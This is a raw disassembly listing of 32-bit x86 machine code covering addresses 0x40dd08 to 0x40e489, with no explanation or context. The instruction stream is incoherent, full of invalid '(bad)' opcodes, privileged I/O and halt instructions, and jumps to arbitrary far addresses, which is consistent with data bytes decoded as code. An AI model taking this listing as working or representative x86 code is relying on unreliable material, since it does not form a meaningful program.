  40dd08:	fcomp  DWORD PTR [edx]
  40dd0a:	inc    esp
  40dd0b:	cmp    al,0x8c
  40dd0d:	das    
  40dd0e:	sbb    DWORD PTR [edi-0x215851db],esi
  40dd14:	add    BYTE PTR [esi-0x64],ah
  40dd17:	ror    BYTE PTR [ebp-0x74ef22b7],cl
  40dd1d:	dec    edi
  40dd1e:	sub    DWORD PTR [ecx-0x5a],edi
  40dd21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd22:	iret   
  40dd23:	fs cwde 
  40dd25:	pop    edx
  40dd26:	in     eax,0x58
  40dd28:	hlt    
  40dd29:	push   esp
  40dd2a:	sti    
  40dd2b:	pop    esi
  40dd2c:	and    esp,DWORD PTR [ecx]
  40dd2e:	sbb    al,0x4a
  40dd30:	loope  0x40dce4
  40dd32:	dec    edi
  40dd33:	dec    edx
  40dd34:	data16 jecxz 0x40dd74
  40dd37:	enter  0xb4c7,0x14
  40dd3b:	into   
  40dd3c:	jl     0x40dd99
  40dd3e:	inc    eax
  40dd3f:	lahf   
  40dd40:	cwde   
  40dd41:	mov    ebx,0xf73cc12a
  40dd46:	cmp    al,0x39
  40dd48:	sub    DWORD PTR [eax-0x22257daa],0x1fa9e309
  40dd52:	and    esp,DWORD PTR [ebx]
  40dd54:	outs   dx,DWORD PTR ds:[esi]
  40dd55:	repnz inc esp
  40dd57:	sbb    eax,0xf99922a3
  40dd5c:	push   0x34cddfc8
  40dd61:	xlat   BYTE PTR ds:[ebx]
  40dd62:	loope  0x40ddce
  40dd64:	sub    cl,ah
  40dd66:	inc    edx
  40dd67:	bound  edx,QWORD PTR [edi-0x692a0023]
  40dd6d:	enter  0x4cfd,0x3e
  40dd71:	lds    edx,FWORD PTR [edi]
  40dd73:	out    dx,eax
  40dd74:	adc    BYTE PTR [esi-0x4a],ah
  40dd77:	clc    
  40dd78:	inc    edi
  40dd79:	fbld   TBYTE PTR [ebx]
  40dd7b:	jae    0x40dd2c
  40dd7d:	add    BYTE PTR [bx+si+0x19],dl
  40dd81:	hlt    
  40dd82:	push   eax
  40dd83:	aad    0x61
  40dd85:	inc    esi
  40dd86:	xchg   ecx,eax
  40dd87:	addr16 (bad) 
  40dd89:	rol    BYTE PTR [ebp-0x49],1
  40dd8c:	outs   dx,DWORD PTR ds:[esi]
  40dd8d:	xor    ecx,DWORD PTR [edi-0x2d85f62]
  40dd93:	scas   eax,DWORD PTR es:[edi]
  40dd94:	xchg   ebp,edx
  40dd96:	mov    WORD PTR [edi+0x1a4d0904],sp
  40dd9d:	addr16 inc esi
  40dd9f:	and    eax,0x98eb5499
  40dda4:	(bad)  
  40dda5:	in     al,0x75
  40dda7:	ins    DWORD PTR es:[edi],dx
  40dda8:	cdq    
  40dda9:	nop
  40ddaa:	das    
  40ddab:	imul   DWORD PTR [eax+ebx*2]
  40ddae:	pop    esi
  40ddaf:	call   0x7cc2:0xe5e97d04
  40ddb6:	leave  
  40ddb7:	sbb    ch,BYTE PTR [eax+edx*4]
  40ddba:	rcl    BYTE PTR [ebx-0x7cc645f6],1
  40ddc0:	shr    esp,1
  40ddc2:	stos   BYTE PTR es:[edi],al
  40ddc3:	cmp    edi,eax
  40ddc5:	loop   0x40ddfc
  40ddc7:	mov    edi,0x92575f0d
  40ddcc:	(bad)  
  40ddcd:	or     al,0xc2
  40ddcf:	sbb    esp,DWORD PTR [ebp-0x32]
  40ddd2:	mov    dh,0x8c
  40ddd4:	push   eax
  40ddd5:	nop
  40ddd6:	jmp    0x40dd5d
  40ddd8:	mov    ebx,0x9497f4f3
  40dddd:	add    eax,DWORD PTR [edx+0x75]
  40dde0:	pop    ebp
  40dde1:	ss mov edi,0xa77a85ac
  40dde7:	jge    0x40dd96
  40dde9:	push   ax
  40ddeb:	sbb    eax,0x47e606db
  40ddf0:	pop    ebx
  40ddf1:	les    edx,FWORD PTR [edi]
  40ddf3:	fcomp  QWORD PTR [ecx+0x7c]
  40ddf6:	pop    ecx
  40ddf7:	inc    eax
  40ddf8:	xlat   BYTE PTR ds:[ebx]
  40ddf9:	pop    ebx
  40ddfa:	push   0x960b8341
  40ddff:	jns    0x40ddb3
  40de01:	jb     0x40ddc8
  40de03:	xchg   ebp,eax
  40de04:	inc    edx
  40de05:	mov    dh,0x37
  40de07:	shl    BYTE PTR [ebp+0x78],cl
  40de0a:	adc    BYTE PTR [ebp+ebp*4-0x2ee8b78e],cl
  40de11:	push   0xbe591db3
  40de16:	jne    0x40ddfd
  40de18:	jae    0x40de12
  40de1a:	(bad)  
  40de1b:	imul   edx,DWORD PTR [edi],0x3d
  40de1e:	mov    ebx,0x8e4b0ebf
  40de23:	jno    0x40ddbb
  40de25:	popf   
  40de26:	mov    eax,0x772660a6
  40de2b:	test   al,0xb4
  40de2d:	sub    cl,BYTE PTR [ebx-0x55]
  40de30:	mov    esi,0x8f260161
  40de35:	or     ah,0xd6
  40de38:	cmp    eax,0xf5f6ac8e
  40de3d:	dec    ecx
  40de3e:	retf   0x7747
  40de41:	push   0xffffffdb
  40de43:	mov    al,ds:0x4adc61a5
  40de48:	fmul   QWORD PTR [edx+0x4a450aa8]
  40de4e:	hlt    
  40de4f:	ret    
  40de50:	mov    al,0x81
  40de52:	outs   dx,BYTE PTR ds:[esi]
  40de53:	pop    esi
  40de54:	sbb    eax,0x1b54f948
  40de59:	test   DWORD PTR [edx],ecx
  40de5b:	ror    DWORD PTR [ebx-0x5186b245],0x55
  40de62:	gs or  eax,0x71591789
  40de68:	or     bh,ch
  40de6a:	push   ebp
  40de6b:	mov    edx,DWORD PTR [ebx-0x57208eea]
  40de71:	out    0xbe,al
  40de73:	jae    0x40ddf5
  40de75:	retf   0x8dc
  40de78:	jmp    0xa2ce65b1
  40de7d:	int    0x8a
  40de7f:	rcl    DWORD PTR [eax],0x83
  40de82:	xchg   esp,eax
  40de83:	mov    bl,0xcf
  40de85:	add    eax,0x15bc594d
  40de8a:	repz adc ah,BYTE PTR ds:0xed0200aa
  40de91:	jae    0x40dede
  40de93:	repnz mov esp,0x5b8121ca
  40de99:	dec    eax
  40de9a:	jns    0x40dedd
  40de9c:	inc    ecx
  40de9d:	js     0x40de48
  40de9f:	(bad)  
  40dea0:	pop    edi
  40dea1:	cmc    
  40dea2:	jmp    0xa49afe57
  40dea7:	shl    BYTE PTR [esi+0x3c],0x9f
  40deab:	push   ebx
  40deac:	mov    cl,0x1e
  40deae:	lock in eax,dx
  40deb0:	ja     0x40df04
  40deb2:	pop    ebx
  40deb3:	ror    DWORD PTR [edx],1
  40deb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40deb6:	xchg   esp,eax
  40deb7:	cs out dx,al
  40deb9:	sub    dl,ah
  40debb:	fucomp st(4)
  40debd:	aas    
  40debe:	cmp    esi,DWORD PTR [ebx+0x5d3ff691]
  40dec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dec5:	push   ecx
  40dec6:	pop    es
  40dec7:	inc    esi
  40dec8:	into   
  40dec9:	fsubr  DWORD PTR [eax+0x57]
  40decc:	ds test eax,0x199895dd
  40ded2:	into   
  40ded3:	stos   DWORD PTR es:[edi],eax
  40ded4:	arpl   di,bp
  40ded6:	dec    edx
  40ded7:	dec    esi
  40ded8:	push   esp
  40ded9:	aas    
  40deda:	jae    0x40de92
  40dedc:	pop    ecx
  40dedd:	inc    ecx
  40dede:	cs dec esi
  40dee0:	(bad)  
  40dee1:	cld    
  40dee2:	xchg   edx,eax
  40dee3:	jnp    0x40df51
  40dee5:	xchg   BYTE PTR es:[ebp-0x26],cl
  40dee9:	mov    ebx,0xf55c3206
  40deee:	and    bl,BYTE PTR [eax]
  40def0:	sub    ebp,DWORD PTR [esi-0x65]
  40def3:	jo     0x40def4
  40def5:	jg     0x40de8c
  40def7:	test   al,dh
  40def9:	lahf   
  40defa:	mov    al,0xa8
  40defc:	mov    dh,0x53
  40defe:	sbb    eax,0x33e1a1fa
  40df03:	outs   dx,BYTE PTR ds:[esi]
  40df04:	sub    esp,DWORD PTR [esi-0x7b]
  40df07:	repnz mov bl,0x6c
  40df0a:	jmp    0x2cff:0x89ec7010
  40df11:	test   eax,0xf3f65cd0
  40df16:	retf   0x4150
  40df19:	pusha  
  40df1a:	nop
  40df1b:	ret    0x8756
  40df1e:	push   esi
  40df1f:	mov    dl,0x14
  40df21:	push   eax
  40df22:	imul   edi,DWORD PTR [esi],0xffffffcf
  40df25:	or     BYTE PTR [ebx-0x54d328a0],dl
  40df2b:	aam    0xd2
  40df2d:	jns    0x40df55
  40df2f:	shr    BYTE PTR [esi-0x79],1
  40df32:	xchg   esp,eax
  40df33:	add    BYTE PTR [ecx],dh
  40df35:	fsub   QWORD PTR [esi+0x4e]
  40df38:	push   ebx
  40df39:	sub    eax,DWORD PTR [esi]
  40df3b:	xchg   ebp,eax
  40df3c:	mov    eax,0xc855e004
  40df41:	sbb    ch,dl
  40df43:	nop
  40df44:	sbb    al,0x7d
  40df46:	adc    al,0x9
  40df48:	mov    esp,0x407c3087
  40df4d:	(bad)  
  40df4e:	xlat   BYTE PTR ds:[ebx]
  40df4f:	mov    ds:0x824f9505,al
  40df54:	mov    WORD PTR [ecx+0x591d23be],ss
  40df5a:	mov    cl,0x22
  40df5c:	jbe    0x40df03
  40df5e:	inc    edx
  40df5f:	in     al,dx
  40df60:	ror    BYTE PTR [ecx],0xd0
  40df63:	mov    ebp,0xc59e40a2
  40df68:	(bad)  
  40df69:	stos   BYTE PTR es:[edi],al
  40df6a:	mov    bl,0x75
  40df6c:	out    dx,al
  40df6d:	add    dh,dh
  40df6f:	mov    ecx,0x23ddec25
  40df74:	std    
  40df75:	mov    eax,0x42a8c67c
  40df7a:	out    0xb8,al
  40df7c:	pop    es
  40df7d:	mov    ch,0xff
  40df7f:	popf   
  40df80:	mul    DWORD PTR [ebp+0x20]
  40df83:	push   cs
  40df84:	jo     0x40df46
  40df86:	mov    esp,0x2a0d4833
  40df8b:	imul   esp,DWORD PTR [eax],0xbb8b27b8
  40df91:	inc    eax
  40df92:	in     al,dx
  40df93:	mov    al,ds:0xa8c4536d
  40df98:	mov    ebx,0x9f26cbed
  40df9d:	ja     0x40df95
  40df9f:	les    ebx,FWORD PTR [edi]
  40dfa1:	push   ebx
  40dfa2:	dec    ecx
  40dfa3:	cld    
  40dfa4:	or     eax,ebp
  40dfa6:	dec    eax
  40dfa7:	imul   esp,DWORD PTR [edi+0x3c],0xa32ff279
  40dfae:	pop    ecx
  40dfaf:	push   cs
  40dfb0:	in     al,dx
  40dfb1:	shl    DWORD PTR [ebx-0x6b],0x77
  40dfb5:	sub    ch,ah
  40dfb7:	mov    ebx,0x206ce773
  40dfbc:	retf   
  40dfbd:	inc    ecx
  40dfbe:	adc    al,0xed
  40dfc0:	pushf  
  40dfc1:	adc    edx,DWORD PTR [ebx+0xb94af90]
  40dfc7:	pop    esi
  40dfc8:	enter  0xe8f7,0x69
  40dfcc:	push   ds
  40dfcd:	pop    DWORD PTR [ecx-0x3d]
  40dfd0:	or     DWORD PTR [ecx],esi
  40dfd2:	sub    eax,0xcf1b3501
  40dfd7:	not    dl
  40dfd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfda:	aaa    
  40dfdb:	xchg   edx,eax
  40dfdc:	xchg   ecx,eax
  40dfdd:	cwde   
  40dfde:	inc    ebx
  40dfdf:	sahf   
  40dfe0:	jnp    0x40dfe8
  40dfe2:	or     al,0x9d
  40dfe4:	(bad)  
  40dfe5:	int    0xb5
  40dfe7:	popa   
  40dfe8:	fild   QWORD PTR [edx+0x3229baf]
  40dfee:	mov    edi,gs
  40dff0:	mov    eax,ds:0x5a56a846
  40dff5:	(bad)  
  40dff6:	jbe    0x40dfc5
  40dff8:	jno    0x40dfe2
  40dffa:	dec    esi
  40dffb:	add    DWORD PTR [edi+eiz*2+0x46],edi
  40dfff:	stos   DWORD PTR es:[edi],eax
  40e000:	sahf   
  40e001:	pop    ds
  40e002:	and    al,0x36
  40e004:	and    eax,0xcf98bac7
  40e009:	ja     0x40dfb7
  40e00b:	pusha  
  40e00c:	cs in  eax,0x9c
  40e00f:	or     eax,0xb76bfca7
  40e014:	inc    esp
  40e015:	fs sbb ebp,esp
  40e018:	dec    edx
  40e019:	stos   BYTE PTR es:[edi],al
  40e01a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e01b:	jmp    FWORD PTR [ebx+0x422733e3]
  40e021:	or     esi,DWORD PTR [esp+esi*1]
  40e024:	mov    dl,0xf7
  40e026:	pop    ds
  40e027:	stc    
  40e028:	jg     0x40dfc0
  40e02a:	dec    ecx
  40e02b:	jle    0x40e02d
  40e02d:	dec    eax
  40e02e:	xor    DWORD PTR [ecx+esi*8+0x65],ebx
  40e032:	xchg   edx,eax
  40e033:	jns    0x40e012
  40e035:	mov    dh,0xd3
  40e037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e038:	idiv   BYTE PTR [ebx]
  40e03a:	rol    BYTE PTR [edi+0x613e1ed3],0x67
  40e041:	mov    ebp,0x52fe5d84
  40e046:	mov    ebx,DWORD PTR [eax+0x5c]
  40e049:	loope  0x40dfea
  40e04b:	adc    eax,DWORD PTR [esi+eiz*2-0x7967dc59]
  40e052:	mov    ebp,0xe592d9f4
  40e057:	ds mov esi,0x9004d8d6
  40e05d:	lock int 0x5b
  40e060:	jb     0x40e0df
  40e062:	pusha  
  40e063:	fcmovne st,st(3)
  40e065:	push   ecx
  40e066:	inc    esp
  40e067:	mov    DWORD PTR ds:0xc3628b49,eax
  40e06d:	into   
  40e06e:	aas    
  40e06f:	or     al,0xcb
  40e071:	(bad)  
  40e073:	in     al,dx
  40e074:	jmp    0x25f5:0x573db391
  40e07b:	dec    esp
  40e07c:	fst    QWORD PTR [ecx]
  40e07e:	dec    esi
  40e07f:	pop    ebx
  40e080:	xor    al,0x69
  40e082:	aas    
  40e083:	mov    bl,0x3b
  40e085:	push   ebp
  40e086:	cmp    al,0x5b
  40e088:	enter  0x738c,0xef
  40e08c:	sar    ecx,1
  40e08e:	stos   DWORD PTR es:[edi],eax
  40e08f:	std    
  40e090:	dec    esi
  40e091:	inc    edi
  40e092:	aas    
  40e093:	xor    edi,DWORD PTR [ecx-0x6f1a7195]
  40e099:	aad    0x63
  40e09b:	jnp    0x40e051
  40e09d:	xchg   ecx,eax
  40e09e:	sub    eax,0xe980e8bc
  40e0a3:	ins    DWORD PTR es:[edi],dx
  40e0a4:	jns    0x40e110
  40e0a6:	sbb    bl,0x3e
  40e0a9:	in     eax,0xd5
  40e0ab:	out    dx,eax
  40e0ac:	mov    dh,0x13
  40e0ae:	aad    0xdf
  40e0b0:	sbb    eax,0xdb6dee0f
  40e0b5:	inc    esp
  40e0b6:	jo     0x40e05a
  40e0b8:	int3   
  40e0b9:	dec    esi
  40e0ba:	ss retf 0x8d01
  40e0be:	test   eax,0x372ba813
  40e0c3:	int3   
  40e0c4:	(bad)  
  40e0c5:	cmc    
  40e0c6:	pusha  
  40e0c7:	arpl   WORD PTR [edi],di
  40e0c9:	jecxz  0x40e098
  40e0cb:	ror    BYTE PTR [edi-0x46605c82],0xe3
  40e0d2:	pusha  
  40e0d3:	mov    ebp,edx
  40e0d5:	fdiv   QWORD PTR [ebx-0x48]
  40e0d8:	aam    0x6a
  40e0da:	lock cmp BYTE PTR [ebx],bl
  40e0dd:	ret    0x5602
  40e0e0:	sub    DWORD PTR [esi+0x77],esp
  40e0e3:	stos   DWORD PTR es:[edi],eax
  40e0e4:	dec    esi
  40e0e5:	or     al,0xc7
  40e0e7:	push   ds
  40e0e8:	inc    ecx
  40e0e9:	push   esi
  40e0ea:	jb     0x40e12b
  40e0ec:	add    ecx,DWORD PTR [edx+eiz*1+0x5a4fdfb1]
  40e0f3:	shl    esp,1
  40e0f5:	mov    ecx,0xa1fac748
  40e0fa:	inc    edi
  40e0fb:	enter  0xb836,0xa5
  40e0ff:	into   
  40e100:	arpl   WORD PTR [ecx],si
  40e102:	push   cs
  40e103:	rcl    BYTE PTR [ecx+ebx*4],1
  40e106:	sub    bh,BYTE PTR [eax+0x5bb8489d]
  40e10c:	xchg   ebx,eax
  40e10d:	ins    DWORD PTR es:[edi],dx
  40e10e:	bound  esp,QWORD PTR [ebx-0x18]
  40e111:	int3   
  40e112:	jmp    0x7a5d:0xa072fecc
  40e119:	mov    edi,0x3b17a6b0
  40e11e:	ins    BYTE PTR es:[edi],dx
  40e11f:	test   eax,0x90b78d3b
  40e124:	jbe    0x40e0a9
  40e126:	jb     0x40e11e
  40e128:	std    
  40e129:	pushf  
  40e12a:	sbb    BYTE PTR [ecx+0xf5d5492],bl
  40e130:	xor    ebx,edi
  40e132:	call   0x3592f76c
  40e137:	add    al,0x86
  40e139:	or     eax,0x7ea7076f
  40e13e:	jmp    0x6d11920
  40e143:	inc    eax
  40e144:	popa   
  40e145:	pop    esp
  40e146:	or     dh,BYTE PTR [esi-0x18]
  40e149:	pop    edi
  40e14a:	or     esi,DWORD PTR [ebx+0x74]
  40e14d:	aas    
  40e14e:	push   cs
  40e14f:	mov    ecx,0x5b9aad0d
  40e154:	mov    bl,0x63
  40e156:	push   edi
  40e157:	ficom  DWORD PTR [edx+0x6f0443e3]
  40e15d:	aas    
  40e15e:	inc    esi
  40e15f:	sub    al,0x56
  40e161:	cmp    bh,bl
  40e163:	and    eax,0xd28d897e
  40e168:	outs   dx,DWORD PTR ds:[esi]
  40e169:	sub    eax,0xaec9195a
  40e16e:	jne    0x40e19b
  40e170:	cmc    
  40e171:	out    dx,eax
  40e172:	xor    eax,0x7f3147e8
  40e177:	mov    dh,0x6b
  40e179:	daa    
  40e17a:	sbb    ah,BYTE PTR [edx+0x5e277ed6]
  40e180:	test   BYTE PTR [edi-0x6620140f],dl
  40e186:	push   0x6cb40c18
  40e18b:	cs mov dh,0x65
  40e18e:	lea    edx,[esi]
  40e190:	and    eax,0x9da39b95
  40e195:	jg     0x40e17e
  40e197:	jnp    0x40e1b9
  40e199:	clc    
  40e19a:	inc    edx
  40e19b:	ja     0x40e151
  40e19d:	(bad)  
  40e19e:	nop
  40e19f:	mov    ebp,eax
  40e1a1:	mov    bh,0xb0
  40e1a3:	mov    bh,0x6e
  40e1a5:	pop    esp
  40e1a6:	inc    ebp
  40e1a7:	imul   ebp,DWORD PTR [edx-0x4151a8f6],0x825224ad
  40e1b1:	std    
  40e1b2:	lods   eax,DWORD PTR es:[esi]
  40e1b4:	mov    esp,0x9e0b14d3
  40e1b9:	in     al,0x76
  40e1bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1bd:	cmp    al,0x95
  40e1bf:	js     0x40e1a2
  40e1c1:	dec    esi
  40e1c2:	pop    esp
  40e1c3:	push   edi
  40e1c4:	push   ebx
  40e1c5:	jbe    0x40e1f0
  40e1c7:	stos   DWORD PTR es:[edi],eax
  40e1c8:	mov    esp,0x865d7478
  40e1cd:	mov    al,0xbc
  40e1cf:	jb     0x40e1d7
  40e1d1:	jnp    0x40e239
  40e1d3:	inc    esi
  40e1d4:	pop    esi
  40e1d5:	inc    esp
  40e1d6:	add    edx,0x67
  40e1d9:	mov    al,ds:0x6b1ae11e
  40e1de:	rcr    ecx,1
  40e1e0:	loope  0x40e1dc
  40e1e2:	stc    
  40e1e3:	in     eax,dx
  40e1e4:	(bad)  
  40e1e6:	(bad)  
  40e1e7:	mov    al,ds:0x872d3a56
  40e1ec:	ficomp DWORD PTR [edx]
  40e1ee:	std    
  40e1ef:	and    al,0x5c
  40e1f1:	pop    esi
  40e1f2:	retf   0xf701
  40e1f5:	mov    bl,0x3f
  40e1f7:	push   eax
  40e1f8:	push   esp
  40e1f9:	and    DWORD PTR [edi+0x54],ecx
  40e1fc:	xlat   BYTE PTR ds:[ebx]
  40e1fd:	jae    0x40e228
  40e1ff:	cmp    eax,edx
  40e201:	lock js 0x40e1e6
  40e204:	jne    0x40e191
  40e206:	scas   al,BYTE PTR es:[edi]
  40e207:	and    BYTE PTR [ebp-0x5e],ah
  40e20a:	dec    ebp
  40e20b:	test   DWORD PTR [edx],0x63685dbd
  40e211:	mov    ?,WORD PTR [ecx-0x17a93a3e]
  40e217:	jmp    0x5000:0xbe70c114
  40e21e:	mov    edi,0xfa70f196
  40e223:	rcr    BYTE PTR [edi-0x2a],1
  40e226:	add    eax,0x51346221
  40e22b:	push   ds
  40e22c:	push   eax
  40e22d:	mov    ds:0x1a055a06,eax
  40e232:	retf   0xf8b8
  40e235:	daa    
  40e236:	xchg   BYTE PTR [esi-0x2e],ah
  40e239:	xor    DWORD PTR [edx+0x15],eax
  40e23c:	mov    ds,WORD PTR [esi]
  40e23e:	inc    edx
  40e23f:	(bad)  
  40e240:	fmul   DWORD PTR [eax-0x2a]
  40e243:	not    edi
  40e245:	test   al,0x94
  40e247:	inc    ebx
  40e248:	dec    edi
  40e249:	jns    0x40e259
  40e24b:	jno    0x40e298
  40e24d:	push   ds
  40e24e:	lods   eax,DWORD PTR ds:[esi]
  40e24f:	adc    DWORD PTR [eax],esp
  40e251:	pushf  
  40e252:	mov    esp,0x22264c17
  40e257:	std    
  40e258:	cmc    
  40e259:	xchg   ebp,eax
  40e25a:	dec    esi
  40e25b:	outs   dx,BYTE PTR ds:[esi]
  40e25c:	sti    
  40e25d:	mov    ecx,0xbdce2ab
  40e262:	daa    
  40e263:	popf   
  40e264:	mov    dl,0xf0
  40e266:	jno    0x40e1ed
  40e268:	pop    ss
  40e269:	pop    ebp
  40e26a:	mov    ebp,ecx
  40e26c:	stos   DWORD PTR es:[edi],eax
  40e26d:	adc    DWORD PTR [ecx+0x7b4ba5b5],0xf30f978d
  40e277:	adc    eax,0xcf6fd919
  40e27c:	test   DWORD PTR [ecx+0x1b],esi
  40e27f:	(bad)  
  40e280:	xor    dl,BYTE PTR [eax+edx*4-0x11a921f2]
  40e287:	jnp    0x40e251
  40e289:	mov    ch,0xa1
  40e28b:	mov    ch,0x88
  40e28d:	jg     0x40e2f7
  40e28f:	inc    ecx
  40e290:	inc    esi
  40e291:	int    0x53
  40e293:	mov    edx,0x433e42b4
  40e298:	xchg   DWORD PTR [ecx+esi*8-0x5c],ebx
  40e29c:	repz fdiv QWORD PTR [eax-0x23]
  40e2a0:	cmp    eax,0xbaf99941
  40e2a5:	push   eax
  40e2a6:	aad    0xb5
  40e2a8:	or     eax,0x38710c
  40e2ad:	lods   eax,DWORD PTR ds:[esi]
  40e2ae:	jecxz  0x40e2be
  40e2b0:	jns    0x40e29d
  40e2b2:	or     eax,0x15ffe8fb
  40e2b7:	(bad)
  40e2bb:	xor    eax,0x32457e2
  40e2c0:	add    bl,al
  40e2c2:	sbb    al,0x8
  40e2c4:	(bad)  
  40e2c5:	mov    ds:0x4624811c,al
  40e2ca:	pusha  
  40e2cb:	js     0x40e255
  40e2cd:	ds fcmovbe st,st(5)
  40e2d0:	push   0x69ac3a94
  40e2d5:	adc    dh,BYTE PTR [ecx+0x69]
  40e2d8:	leave  
  40e2d9:	adc    al,0xb0
  40e2db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2dc:	or     BYTE PTR [esi],0x1e
  40e2df:	repz xor DWORD PTR [ebx-0x54c2e12e],edx
  40e2e6:	aas    
  40e2e7:	ror    BYTE PTR [ecx-0x55],0xca
  40e2eb:	jge    0x40e2b1
  40e2ed:	lahf   
  40e2ee:	out    0xeb,eax
  40e2f0:	jbe    0x40e304
  40e2f2:	into   
  40e2f3:	scas   al,BYTE PTR es:[edi]
  40e2f4:	jnp    0x40e357
  40e2f6:	dec    ecx
  40e2f7:	leave  
  40e2f8:	jae    0x40e305
  40e2fa:	xor    BYTE PTR [ebx],bl
  40e2fc:	in     al,dx
  40e2fd:	inc    esi
  40e2fe:	sub    si,bp
  40e301:	bound  ecx,QWORD PTR [ecx-0x34a0c41e]
  40e307:	xchg   BYTE PTR [edx+edx*8+0x2d],cl
  40e30b:	mov    esp,0x69f86422
  40e310:	push   0xae9936fc
  40e315:	and    DWORD PTR [ecx-0x55],0xfffffff1
  40e319:	cli    
  40e31a:	mov    ebx,0x8d028e78
  40e31f:	dec    edx
  40e320:	inc    ebp
  40e321:	aas    
  40e322:	arpl   cx,si
  40e324:	sahf   
  40e325:	mov    ebp,0xe782c6ea
  40e32a:	aas    
  40e32b:	in     eax,0x57
  40e32d:	iret   
  40e32e:	pop    ds
  40e32f:	dec    eax
  40e330:	dec    edi
  40e331:	dec    esp
  40e332:	push   eax
  40e333:	sub    DWORD PTR ds:0x438a74d1,eax
  40e339:	repz and esp,DWORD PTR [esi-0x7b]
  40e33d:	test   al,0x6f
  40e33f:	inc    edi
  40e340:	idiv   DWORD PTR [ebp+0x42a7aef6]
  40e346:	or     bl,cl
  40e348:	mov    ds:0x3f5c06fe,al
  40e34d:	fwait
  40e34e:	test   DWORD PTR [ebx+edx*2-0x3b],0x7dafa8c3
  40e356:	addr16 jg 0x40e313
  40e359:	and    bl,bh
  40e35b:	into   
  40e35c:	mov    edx,0x109be101
  40e361:	inc    esi
  40e362:	inc    edi
  40e363:	xor    ah,BYTE PTR [esi+edi*1]
  40e366:	stos   DWORD PTR es:[edi],eax
  40e367:	sbb    eax,0x9f436f3d
  40e36c:	add    DWORD PTR [edx+0x5f98a43f],ebp
  40e372:	neg    al
  40e374:	sar    BYTE PTR [esi+edx*2],0xf6
  40e378:	std    
  40e379:	add    ecx,esp
  40e37b:	loope  0x40e3e8
  40e37d:	in     eax,0x69
  40e37f:	int    0x94
  40e381:	adc    eax,0x32e575e1
  40e386:	scas   eax,DWORD PTR es:[edi]
  40e387:	(bad)  
  40e388:	outs   dx,DWORD PTR ds:[esi]
  40e389:	int3   
  40e38a:	xor    BYTE PTR [esi],bl
  40e38c:	mov    esi,0x71c7c6a5
  40e391:	js     0x40e3d4
  40e393:	enter  0x80a4,0xe4
  40e397:	or     eax,0x343e6a6c
  40e39c:	cmp    BYTE PTR ss:[edi-0x31],dl
  40e3a0:	inc    ecx
  40e3a1:	clc    
  40e3a2:	retf   0x93af
  40e3a5:	in     al,0x2e
  40e3a7:	mov    ?,WORD PTR [edx]
  40e3a9:	inc    esi
  40e3aa:	sub    dl,BYTE PTR [ebx+ecx*4]
  40e3ad:	ins    DWORD PTR es:[edi],dx
  40e3ae:	mov    edi,DWORD PTR [eax]
  40e3b0:	rcl    DWORD PTR [edx+0x359a519],0xdf
  40e3b7:	lds    ebx,FWORD PTR [eax-0x6b]
  40e3ba:	repz imul esi,DWORD PTR [ecx-0x7a],0xfffffff2
  40e3bf:	sbb    esi,0x1bb33d8b
  40e3c5:	xchg   esi,esi
  40e3c7:	into   
  40e3c8:	aad    0x86
  40e3ca:	sbb    al,BYTE PTR [eax]
  40e3cc:	xchg   ecx,eax
  40e3cd:	mov    esp,DWORD PTR [eax*4+0x60bbf134]
  40e3d4:	mov    ds:0xb0ba310,eax
  40e3d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3da:	sbb    DWORD PTR [edx-0x96f7e99],edx
  40e3e0:	mov    ebp,0xcc5ebdbd
  40e3e5:	mov    fs,esp
  40e3e7:	or     eax,0x8753c87a
  40e3ec:	data16 sub BYTE PTR [eax],bl
  40e3ef:	xor    al,0x7d
  40e3f1:	(bad)  
  40e3f2:	adc    eax,0x7bec3565
  40e3f7:	(bad)  
  40e3f8:	stc    
  40e3f9:	push   0xc5c579c0
  40e3fe:	hlt    
  40e3ff:	jl     0x40e3cb
  40e401:	xchg   ecx,eax
  40e402:	sbb    eax,DWORD PTR [ebp-0x5b]
  40e405:	lds    eax,FWORD PTR ds:[ebp-0x471bbc24]
  40e40c:	addr16 repz push esi
  40e40f:	test   al,0x5
  40e411:	test   BYTE PTR [esi-0x5],al
  40e414:	stos   BYTE PTR es:[edi],al
  40e415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e416:	or     eax,DWORD PTR [edx-0x24]
  40e419:	cld    
  40e41a:	cmp    al,BYTE PTR [esi]
  40e41c:	inc    ecx
  40e41d:	pop    es
  40e41e:	mov    esi,0xeec9f7b3
  40e423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e424:	push   ecx
  40e425:	cwde   
  40e426:	pop    ebx
  40e427:	loop   0x40e3e1
  40e429:	nop
  40e42a:	jmp    0xdc0a0e8c
  40e42f:	adc    eax,DWORD PTR [eax+0x5bbb0283]
  40e435:	inc    edi
  40e436:	dec    ebp
  40e437:	call   0x91e1ca5c
  40e43c:	test   eax,0x64997dcc
  40e441:	jp     0x40e495
  40e443:	es scas al,BYTE PTR es:[edi]
  40e445:	into   
  40e446:	ds mov bl,0x4b
  40e449:	push   es
  40e44a:	cmc    
  40e44b:	test   DWORD PTR [edx+eiz*2-0xc],0x7945400a
  40e453:	sub    BYTE PTR [edx+0x7960fa00],0x42
  40e45a:	mov    BYTE PTR [edx+0x20],bl
  40e45d:	mov    edi,0x58f527f3
  40e462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e463:	aaa    
  40e464:	inc    esp
  40e465:	loop   0x40e466
  40e467:	xchg   edi,eax
  40e468:	jg     0x40e482
  40e46a:	mov    ebp,0xe05d7f8f
  40e46f:	adc    bl,BYTE PTR [ebx-0x50e9e89d]
  40e475:	loop   0x40e49d
  40e477:	pop    ebp
  40e478:	add    al,0x7f
  40e47a:	aas    
  40e47b:	add    al,0x4f
  40e47d:	xor    eax,DWORD PTR [esp+ebx*4-0x713ce73f]
  40e484:	test   al,0x1c
  40e486:	cli    
  40e487:	aas    
  40e488:	sahf   
  40e489:	sbb    BYTE PTR [eax-0x4a],bh
